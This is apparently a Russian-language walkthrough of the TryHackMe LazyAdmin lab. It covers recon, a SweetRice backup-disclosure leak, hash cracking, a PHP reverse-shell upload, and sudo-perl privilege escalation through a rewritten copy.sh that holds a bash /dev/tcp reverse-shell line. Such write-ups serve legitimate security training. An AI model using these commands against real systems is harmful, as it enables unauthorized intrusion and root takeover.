# TryHackMe: LazyAdmin

## Task 1: Lazy Admin
Первым делом проведем разведку - найдем открытые порты на атакуемой машине:
```sh
nmap -sC -sV 10.10.63.85
```
![ScreenShot](screenshots/1.png)

Мы нашли:
- 22 port - SSH (OpenSSH 7.2p2)
- 80 port - HTTP (Apache httpd 2.4.18)

Посмотрим,что находится на 80 порте:

![ScreenShot](screenshots/2.png)

Стартовая страница представляет собой дефолтную страницу Apache. Пробуем найти какие-либо другие директории:
```sh
gobuster dir -u http://10.10.63.85/ -w /usr/share/wordlists/dirb/common.txt
```
![ScreenShot](screenshots/3.png)

Найдена диретория */content*. Перейдем к ней:

![ScreenShot](screenshots/4.png)

Видим сообщение о том, что сайт находится на этапе разработки, а также, что самое главное - в футере написан движок сайта. Больше на этой странице полезного ничего нет, даже единственная ссылка ни к чему серьезному не ведет.

Скорее всего, если сайт работает на каком-то движке, а в нашем случае это SweetRice, то должны быть еще директории. Как это можно узнать? Во-первых, как и ранее, использовать сканирование директорий, более тщательно подбирая словари, но мы пойдем альтернативным и более простым путем. Гуглим что-нибудь в стиле *SweetRice GitHub* и дейстительно находим репозиторий движка:

![ScreenShot](screenshots/5.png)

Ппробуем применить названия папок в репозитории в качестве директорий на нашем ресурсе:

![ScreenShot](screenshots/6.png)

Вот и первый успех - окно авторизации. Это хорошо, но с какими учетными данными входить? Нужно их как-то найти. Далее я решил поискать эксплойты к данному движку на **Exploit DB** и я был крайне удивлен, их нашлось целых 8 штук:

![ScreenShot](screenshots/7.png)

Судя по названиям есть только 1 эксплойт, который в теории может показать учетные данные при его эклуатации - **Backup Disclosure**. Более детально посмотрим его:

![ScreenShot](screenshots/8.png)

Видим описание, в котором сказано, что через путь */inc/mysql_backup* можно зайти и достать файл. Пробуем:

![ScreenShot](screenshots/9.png)

И вот действительно, в директории лежит файл с расширением *.sql*. Скачиваем его и анализируем:

![ScreenShot](screenshots/10.png)

Можно заметить, что присутствует два пользователя *admin* и *manager*, а также имеется зашифрованный пароль. Судя по всему, это пароль от учетной записи *manager*. Попробуем его расшифровать. Для начала стоит сохранить сохранить хэш пароля, который мы нашли, в отдельный текстовый файл (у меня это hashed-passwd.txt). Теперь нам необходимо узнать тип хэша, для чего мы используем утилиту **hash-identifier**:

![ScreenShot](screenshots/11.png)

В результате видим, что скорее всего это MD5. Пробуем расшифровать с помощью **John The Ripper**:
```sh
john -form=dnamic='md5($p)' --wordlist=/usr/share/wordlists/rockyou.txt hashed-passwd.txt
```
![ScreenShot](screenshots/12.png)

Полученный пароль - *Password123*
> Note: Будьте внимательны при использовании данной команды, т.к. есть риск плучить неверный пароль, как это роизошло у меня. Не используйте ...-w /usr/share..., вместо этого нужно использовать опцию через двойное тире ...--wordlist=/usr/share/.... Ниже показан пример неправильной дешифровки пароля

![ScreenShot](screenshots/13.png)

Мы получили логин и пароль для входа: **manager** | **Password123**. Пробуем авторизоваться на сайте:

![ScreenShot](screenshots/14.png)

Проанализировав сайт, можно сделать предположение о том, что в какую-нибудь из директорий можно что-то загрузить. Предположительно, может загружать что-то админ. Скорее всего это можно сделать через такие разделы, как *Post*, *Ads*, *Attachment* или куда-то еще. В таком случае попробуем посмотреть другие эксплойты, которые мы нашли ранее.

Эксплойт, связанный с загрузкой файлов - Arbitrary File Upload. Скачиваем файл и исследуем работу скрипта:

![ScreenShot](screenshots/15.png)

Для начала запрашиваются необходмые данные: таргет, логин, пароль и загружаемый файл. Далее формируетя ссылка вместе с данными для входа. Если данные верны, то авторизация проходит успешно и уже далее формируется новая ссылка, благодаря которой и происходит загрузка файла на сервер.

> Note: Тут при вводе таргета нужно быть предельно внимательным, т.к. из-за этого сформируется неправильная ссылка. Если ввести просто адрес (10.10.63.85), то файл не загрузится, потому что в итоговых ссылках будет пропущена директория */content*, что приведет к неправильному пути. Именно поэтому в поле таргет необходимо ввести 10.10.63.85/content

Также нам понадобится shell. Обратимся к известному репозиторию (https://github.com/pentestmonkey/php-reverse-shell) и скачаем файл. Меняем в нем настройки и расширение на .phtml во избежание фильтров (если таковые там вообще присутствуют):

![ScreenShot](screenshots/16.png)

Далее в отдельно терминале прослушиваем порт 4444 с помощью netcat:

![ScreenShot](screenshots/17.png)

Применяем загруженный эксплойт:

![ScreenShot](screenshots/18.png)

Далее при помощи утилиты curl активируем скрипт:
```sh
curl http://10.10.63.85/content/attachment/shell.phtml
```
![ScreenShot](screenshots/19.png)

Если все сделано верно, то мы получим reverse shell:

![ScreenShot](screenshots/20.png)

Сразу смотрим, кто мы и что мы можем делать от лица sudo:

![ScreenShot](screenshots/21.png)

### Question 1: What is the user flag?
Попробуем посмотреть, что у нас находится в директории */home*. Видим директорию пользователя itguy. Смотрим, что находится внутри директории */itguy* и находим первый флаг:

![ScreenShot](screenshots/22.png)

### Question 2: What is the root flag?
Нам доступны для выполнения *perl* для *backup.pl*. На GTFOBins есть способ повышения привилегий через perl, но в данном случае он напрямую не сработал:

![ScreenShot](screenshots/23.png)

А вот далее, прочитав файл *backup.pl*, можно заметить, что через непосредственно *perl* можно выполнить *backup.pl*, который в свою очередь выполнит *copy.sh*

![ScreenShot](screenshots/24.png)

Просмотрим содержимое файла *copy.sh*:

![ScreenShot](screenshots/25.png)

В прочем, содержимое его нас мало волнует, потому что мы можем менять и запускать его. Вносим изменения в файл:
```sh
echo "bash -c 'bash -i >& /dev/tcp/<your tun0 IP>/9001 0>&1'" > copy.sh 
```
![ScreenShot](screenshots/26.png)

В отдельном терминале слушаем порт 9001:
```sh
nc -lvnp 9001
```
![ScreenShot](screenshots/27.png)

Запуск:
```sh
./copy.sh
```

```sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

Если все выполнено верно, получаем еще один reverse shell, причем с root-привилегиями:

![ScreenShot](screenshots/28.png)

Дальше дело техники, забираем root-флаг:

![ScreenShot](screenshots/29.png)

## Addons
P.S. №1: Все необходимые директории можно было найти не прибегая к GitHub, нужно было просканировать директории "правильным" словарем - **/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt**

P.S. №2: В данном случае можно было использовать не только один эксплойт **Arbitrary File Upload**. Можно рассмотреть и **Cross-Site Request Forgery / PHP Code Execution** через раздел */ads*. Как это работает? Мы копируем код эксплойта (как и ранее от PentestMonkey), меняем IP-адрес и порт, вставляем код поле *Ads code*. 

![ScreenShot](screenshots/30.png)

![ScreenShot](screenshots/31.png)

Загружаем и получаем следующий код:

![ScreenShot](screenshots/32.png)

Единственный момент, чтобы он запустился в дальнейшем, необходимо в настройках (Setting -> General -> Website Settings) убрать галочку c *Close Website*.

Переходим по ссылке, которую мы получили в параметре *src*, и, если все сделано правильно, мы получим reverse shell:

![ScreenShot](screenshots/33.png)
